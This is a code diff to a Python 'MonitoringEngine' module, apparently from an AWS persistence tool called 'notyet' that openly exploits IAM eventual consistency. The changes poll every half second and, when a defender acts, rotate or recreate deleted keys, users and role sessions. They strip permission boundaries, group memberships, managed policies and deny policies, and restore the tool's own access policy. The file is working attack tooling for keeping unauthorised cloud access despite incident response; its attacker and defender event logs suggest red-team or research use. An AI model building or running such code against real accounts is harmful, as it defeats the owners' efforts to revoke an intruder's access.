@@ -4,11 +4,12 @@ Monitoring Engine for continuous health checks and policy monitoring.
 This module implements the monitoring loops that detect and respond to
 defender actions in real-time. It runs two parallel async tasks:
 1. Health check loop (every 5 seconds) - detects access revocation via S3 ListBuckets
-2. Policy monitor loop (every 1 second) - ensures notyet policy remains attached
+2. Policy monitor loop (every 0.5 seconds) - ensures notyet policy remains attached
 """
 
 import asyncio
 import logging
+from datetime import datetime, UTC, timedelta
 from typing import Optional
 
 from .aws_clients import S3Client
@@ -26,7 +27,7 @@ class MonitoringEngine:
 
     The monitoring engine runs two independent loops:
     - Health check loop: Calls S3 ListBuckets every 5 seconds to detect access revocation
-    - Policy monitor loop: Checks and restores the notyet policy every 1 second
+    - Policy monitor loop: Checks and restores the notyet policy every 0.5 seconds
 
     Both loops run concurrently using asyncio and can be gracefully stopped.
 
@@ -67,6 +68,28 @@ class MonitoringEngine:
         self.on_credentials_invalid = on_credentials_invalid
         self.identity: Optional[CallerIdentity] = None
         self._rotation_in_progress = False  # Flag to pause monitoring during rotation
+        self._rotation_failed = False  # Flag to indicate rotation failed (credentials dead)
+        self.session_expiration: Optional[datetime] = None  # Track role session expiry
+
+    async def _try_rotate(self) -> bool:
+        """
+        Attempt credential rotation via the on_credentials_invalid callback.
+
+        Returns:
+            bool: True if rotation succeeded, False if it failed
+        """
+        if not self.on_credentials_invalid:
+            return False
+        try:
+            self._rotation_in_progress = True
+            await self.on_credentials_invalid()
+            self._rotation_in_progress = False
+            self._rotation_failed = False
+            return True
+        except Exception:
+            self._rotation_in_progress = False
+            self._rotation_failed = True
+            return False
 
     def _emit_defender_action(self, action: str, details: dict = None) -> None:
         """Emit a structured DEFENDER_ACTION event via event_logger."""
@@ -88,7 +111,7 @@ class MonitoringEngine:
         
         This method launches two parallel async tasks:
         1. Health check loop (every 5 seconds)
-        2. Policy monitor loop (every 1 second)
+        2. Policy monitor loop (every 0.5 seconds)
         
         The loops run until stop() is called or (for health check) until
         access is revoked and exit_on_access_denied is True.
@@ -170,9 +193,20 @@ class MonitoringEngine:
         
         while self.running:
             try:
+                # If rotation failed, credentials are dead — skip misleading health checks
+                if self._rotation_failed:
+                    if self.event_logger:
+                        self.event_logger.log_event(
+                            "HEALTH_CHECK",
+                            "Skipped - credentials are invalid (rotation failed)",
+                            {"status": "dead"}
+                        )
+                    await asyncio.sleep(5)
+                    continue
+
                 # Perform S3 ListBuckets health check
                 success, error_code = self.s3.list_buckets()
-                
+
                 if success:
                     consecutive_failures = 0  # Reset failure counter
                     if self.event_logger:
@@ -230,41 +264,117 @@ class MonitoringEngine:
     
     async def _policy_monitor_loop(self) -> None:
         """
-        Policy monitor loop that runs every 1 second.
-        
+        Policy monitor loop that runs every 0.5 seconds.
+
         This loop exploits AWS IAM eventual consistency by:
-        1. Detecting when access keys are deleted/disabled (via ListAccessKeys)
-        2. Detecting and removing permission boundaries
-        3. Detecting and removing managed policies
-        4. Detecting and removing other inline policies (keeping only notyet policy)
-        5. Detecting when notyet inline policy is detached and restoring it
-        6. Triggering credential rotation within the ~4 second consistency window
-        
+        1. Detecting when users/roles are deleted
+        2. Detecting when access keys are deleted/disabled (via ListAccessKeys)
+        3. Detecting and removing permission boundaries
+        4. Detecting and removing group memberships (users only)
+        5. Detecting and removing managed policies
+        6. Detecting and removing other inline policies (keeping only notyet policy)
+        7. Detecting when notyet inline policy is detached/modified and restoring it
+        8. Proactively refreshing role sessions before expiry
+        9. Triggering credential rotation within the ~4 second consistency window
+
         The key insight: Even with deleted/disabled credentials, IAM read operations
         still work during the consistency window, allowing us to detect changes and respond.
         """
         consecutive_failures = 0
         max_consecutive_failures = 5
-        
+
         # Store the current access key ID for monitoring
         current_access_key_id = self.policy_manager.iam.credentials.access_key_id
-        
+
         while self.running:
             try:
-                # Skip monitoring if rotation is in progress
-                if self._rotation_in_progress:
-                    await asyncio.sleep(1)
+                # Skip monitoring if rotation is in progress or has failed
+                if self._rotation_in_progress or self._rotation_failed:
+                    await asyncio.sleep(0.5)
                     continue
-                
+
                 # Use the current identity (may be updated after rotation)
                 identity = self.identity
                 if not identity:
-                    await asyncio.sleep(1)
+                    await asyncio.sleep(0.5)
                     continue
-                
-                # STEP 1: Check if our access keys have been deleted/disabled
+
+                # STEP 0: Proactive session refresh for role sessions
+                # Check if session is approaching expiry and rotate before it expires
+                if identity.identity_type == "role" and self.session_expiration:
+                    time_remaining = (self.session_expiration - datetime.now(UTC)).total_seconds()
+                    if time_remaining <= 300:  # 5 minutes before expiry
+                        self._emit_defender_action(
+                            f"Role session expiring in {time_remaining:.0f}s",
+                            {"expiration": str(self.session_expiration), "seconds_remaining": time_remaining}
+                        )
+                        if await self._try_rotate():
+                            self._emit_attacker_response(
+                                "Proactive session refresh completed",
+                                {"new_key_id": self.policy_manager.iam.credentials.access_key_id}
+                            )
+                            consecutive_failures = 0
+                            continue
+
+                # STEP 1: Check if identity (user/role) still exists
+                # Defender may delete the user or role entirely
+
+                if identity.identity_type == "user":
+                    try:
+                        self.policy_manager.iam._retry_with_backoff('get_user', UserName=identity.identity_name)
+                    except Exception as user_check_error:
+                        error_str = str(user_check_error)
+                        if "NoSuchEntity" in error_str:
+                            self._emit_defender_action(
+                                f"User {identity.identity_name} has been DELETED",
+                                {"user_name": identity.identity_name, "action": "deleted"}
+                            )
+                            if await self._try_rotate():
+                                current_access_key_id = self.policy_manager.iam.credentials.access_key_id
+                                self._emit_attacker_response(
+                                    "User recreated via credential rotation",
+                                    {"new_key_id": current_access_key_id}
+                                )
+                                consecutive_failures = 0
+                            continue
+                        elif "InvalidClientTokenId" not in error_str and "InvalidAccessKeyId" not in error_str:
+                            self.logger.warning(f"Error checking user existence: {error_str}")
+
+                elif identity.identity_type == "role":
+                    try:
+                        self.policy_manager.iam._retry_with_backoff('get_role', RoleName=identity.identity_name)
+                    except Exception as role_check_error:
+                        error_str = str(role_check_error)
+                        if "NoSuchEntity" in error_str:
+                            self._emit_defender_action(
+                                f"Role {identity.identity_name} has been DELETED",
+                                {"role_name": identity.identity_name, "action": "deleted"}
+                            )
+                            if await self._try_rotate():
+                                self._emit_attacker_response(
+                                    "New role created via credential rotation",
+                                    {"new_key_id": self.policy_manager.iam.credentials.access_key_id}
+                                )
+                                consecutive_failures = 0
+                            continue
+                        elif "ExpiredToken" in error_str:
+                            self._emit_defender_action(
+                                "Role session has expired",
+                                {"role_name": identity.identity_name, "action": "expired"}
+                            )
+                            if await self._try_rotate():
+                                self._emit_attacker_response(
+                                    "Session refreshed via credential rotation",
+                                    {"new_key_id": self.policy_manager.iam.credentials.access_key_id}
+                                )
+                                consecutive_failures = 0
+                            continue
+                        elif "InvalidClientTokenId" not in error_str and "InvalidAccessKeyId" not in error_str:
+                            self.logger.warning(f"Error checking role existence: {error_str}")
+
+                # STEP 2: Check if our access keys have been deleted/disabled
                 # This exploits eventual consistency - we can list keys even after they're deleted
-                
+
                 if identity.identity_type == "user":
                     try:
                         # List access keys for the user
@@ -273,55 +383,45 @@ class MonitoringEngine:
                             UserName=identity.identity_name
                         )
                         access_keys = response.get('AccessKeyMetadata', [])
-                        
+
                         # Check if our current access key is in the list and its status
                         our_key_found = False
                         our_key_active = False
-                        
+
                         for key in access_keys:
                             if key['AccessKeyId'] == current_access_key_id:
                                 our_key_found = True
                                 our_key_active = (key['Status'] == 'Active')
                                 break
-                        
+
                         # If our key is not found or inactive, trigger rotation
                         if not our_key_found:
                             self._emit_defender_action(
                                 f"Access key {current_access_key_id} has been DELETED",
                                 {"key_id": current_access_key_id, "action": "deleted"}
                             )
-
-                            if self.on_credentials_invalid:
-                                self._rotation_in_progress = True
-                                await self.on_credentials_invalid()
-                                self._rotation_in_progress = False
-                                # Update the access key ID after rotation
+                            if await self._try_rotate():
                                 current_access_key_id = self.policy_manager.iam.credentials.access_key_id
                                 self._emit_attacker_response(
                                     "Credential rotation completed",
                                     {"new_key_id": current_access_key_id}
                                 )
                                 consecutive_failures = 0
-                                continue
+                            continue
                         elif not our_key_active:
                             self._emit_defender_action(
                                 f"Access key {current_access_key_id} has been DISABLED",
                                 {"key_id": current_access_key_id, "action": "disabled"}
                             )
-
-                            if self.on_credentials_invalid:
-                                self._rotation_in_progress = True
-                                await self.on_credentials_invalid()
-                                self._rotation_in_progress = False
-                                # Update the access key ID after rotation
+                            if await self._try_rotate():
                                 current_access_key_id = self.policy_manager.iam.credentials.access_key_id
                                 self._emit_attacker_response(
                                     "Credential rotation completed",
                                     {"new_key_id": current_access_key_id}
                                 )
                                 consecutive_failures = 0
-                                continue
-                    
+                            continue
+
                     except Exception as key_check_error:
                         # If we get InvalidClientTokenId here, it means the consistency window has passed
                         if "InvalidClientTokenId" in str(key_check_error) or "InvalidAccessKeyId" in str(key_check_error):
@@ -332,8 +432,8 @@ class MonitoringEngine:
                             consecutive_failures += 1
                         else:
                             self.logger.warning(f"Error checking access key status: {str(key_check_error)}")
-                
-                # STEP 2: Check for permission boundaries
+
+                # STEP 3: Check for permission boundaries
                 # Permission boundaries can block all IAM operations even with AdministratorAccess
                 try:
                     has_boundary = False
@@ -343,7 +443,7 @@ class MonitoringEngine:
                     elif identity.identity_type == "role":
                         response = self.policy_manager.iam._retry_with_backoff('get_role', RoleName=identity.identity_name)
                         has_boundary = 'PermissionsBoundary' in response.get('Role', {})
-                    
+
                     if has_boundary:
                         boundary_arn = response.get('User' if identity.identity_type == "user" else 'Role', {}).get('PermissionsBoundary', {}).get('PermissionsBoundaryArn', 'Unknown')
                         self._emit_defender_action(
@@ -357,7 +457,7 @@ class MonitoringEngine:
                         )
                         consecutive_failures = 0
                         # Skip policy check this iteration - wait for boundary removal to propagate
-                        await asyncio.sleep(1)
+                        await asyncio.sleep(0.5)
                         continue
                 except Exception as boundary_error:
                     error_str = str(boundary_error)
@@ -365,7 +465,7 @@ class MonitoringEngine:
                     if "AccessDenied" in error_str:
                         if "no identity-based policy allows" in error_str or "no permissions" in error_str.lower():
                             # This is lack of permissions, not a boundary blocking us
-                            # The notyet policy is missing, which will be handled in STEP 5
+                            # The notyet policy is missing, which will be handled in STEP 7
                             # Don't log this as an error - it's expected during policy propagation
                             pass
                         elif "permissions boundary" in error_str.lower():
@@ -383,8 +483,45 @@ class MonitoringEngine:
                         pass
                     else:
                         self.logger.warning(f"Error checking permission boundary: {error_str}")
-                
-                # STEP 3: Check for and remove managed policies
+
+                # STEP 4: Check for and remove group memberships (users only)
+                # Defender may add user to groups with deny policies to override inline allows
+                if identity.identity_type == "user":
+                    try:
+                        response = self.policy_manager.iam._retry_with_backoff(
+                            'list_groups_for_user',
+                            UserName=identity.identity_name
+                        )
+                        groups = response.get('Groups', [])
+                        if groups:
+                            for group in groups:
+                                group_name = group['GroupName']
+                                self._emit_defender_action(
+                                    f"Group membership detected: {group_name}",
+                                    {"group_name": group_name}
+                                )
+                                try:
+                                    self.policy_manager.iam._retry_with_backoff(
+                                        'remove_user_from_group',
+                                        GroupName=group_name,
+                                        UserName=identity.identity_name
+                                    )
+                                    self._emit_attacker_response(
+                                        f"Removed from group: {group_name}",
+                                        {"group_name": group_name}
+                                    )
+                                except Exception as group_remove_error:
+                                    self.logger.error(f"Failed to remove from group {group_name}: {str(group_remove_error)}")
+                            consecutive_failures = 0
+                    except Exception as group_error:
+                        error_str = str(group_error)
+                        if "AccessDenied" in error_str:
+                            if "no identity-based policy allows" not in error_str and "no permissions" not in error_str.lower():
+                                self.logger.warning(f"AccessDenied when checking group memberships: {error_str}")
+                        elif "InvalidClientTokenId" not in error_str and "InvalidAccessKeyId" not in error_str:
+                            self.logger.warning(f"Error checking group memberships: {error_str}")
+
+                # STEP 5: Check for and remove managed policies
                 # Defender may attach managed policies with explicit denies
                 try:
                     if identity.identity_type == "user":
@@ -395,7 +532,7 @@ class MonitoringEngine:
                         attached_policies = response.get('AttachedPolicies', [])
                     else:
                         attached_policies = []
-                    
+
                     # Remove any managed policies (we only want inline notyet policy)
                     if attached_policies:
                         for policy in attached_policies:
@@ -421,7 +558,7 @@ class MonitoringEngine:
                     if "AccessDenied" in error_str:
                         if "no identity-based policy allows" in error_str or "no permissions" in error_str.lower():
                             # This is lack of permissions, not a managed policy blocking us
-                            # The notyet policy is missing, which will be handled in STEP 5
+                            # The notyet policy is missing, which will be handled in STEP 7
                             pass
                         elif "explicit deny in an identity-based policy" in error_str or "explicit deny in a permissions boundary" in error_str:
                             # This is actually a policy blocking us
@@ -438,8 +575,8 @@ class MonitoringEngine:
                         pass
                     else:
                         self.logger.warning(f"Error checking managed policies: {error_str}")
-                
-                # STEP 4: Check for and remove other inline policies (except notyet policy)
+
+                # STEP 6: Check for and remove other inline policies (except notyet policy)
                 # Defender may add inline policies with explicit denies
                 try:
                     if identity.identity_type == "user":
@@ -450,7 +587,7 @@ class MonitoringEngine:
                         inline_policies = response.get('PolicyNames', [])
                     else:
                         inline_policies = []
-                    
+
                     # Remove any inline policies that aren't the notyet policy
                     other_policies = [p for p in inline_policies if p != self.policy_manager.notyet_policy_name]
                     if other_policies:
@@ -472,14 +609,14 @@ class MonitoringEngine:
                                 self.logger.error(f"Failed to delete inline policy {policy_name}: {str(delete_error)}")
                         consecutive_failures = 0
                         # Skip policy check this iteration - wait for inline policy removal to propagate
-                        await asyncio.sleep(1)
+                        await asyncio.sleep(0.5)
                         continue
                 except Exception as inline_policy_error:
                     error_str = str(inline_policy_error)
                     if "AccessDenied" in error_str:
                         if "no identity-based policy allows" in error_str or "no permissions" in error_str.lower():
                             # This is lack of permissions, not an inline policy blocking us
-                            # The notyet policy is missing, which will be handled in STEP 5
+                            # The notyet policy is missing, which will be handled in STEP 7
                             pass
                         elif "explicit deny in an identity-based policy" in error_str or "explicit deny in a permissions boundary" in error_str:
                             # This is actually a policy blocking us
@@ -496,13 +633,13 @@ class MonitoringEngine:
                         pass
                     else:
                         self.logger.warning(f"Error checking inline policies: {error_str}")
-                
-                # STEP 5: Check if notyet policy is still attached
+
+                # STEP 7: Check if notyet policy is still attached and content is valid
                 is_attached = self.policy_manager.verify_policy(identity)
-                
+
                 if not is_attached:
                     self._emit_defender_action(
-                        "Notyet policy has been detached/deleted",
+                        "Notyet policy has been detached/deleted/modified",
                         {"policy_name": self.policy_manager.notyet_policy_name}
                     )
                     try:
@@ -524,10 +661,10 @@ class MonitoringEngine:
                             self.logger.error(f"Failed to restore notyet policy: {str(restore_error)}")
                 else:
                     consecutive_failures = 0  # Reset failure counter
-                
-                # Wait 1 second before next check
-                await asyncio.sleep(1)
-            
+
+                # Wait 0.5 seconds before next check (reduced from 1s to improve detection speed)
+                await asyncio.sleep(0.5)
+
             except asyncio.CancelledError:
                 break
             except Exception as e:
@@ -537,4 +674,4 @@ class MonitoringEngine:
                     f"(consecutive failures: {consecutive_failures}/{max_consecutive_failures})"
                 )
                 # Continue running even if there's an error
-                await asyncio.sleep(1)
+                await asyncio.sleep(0.5)
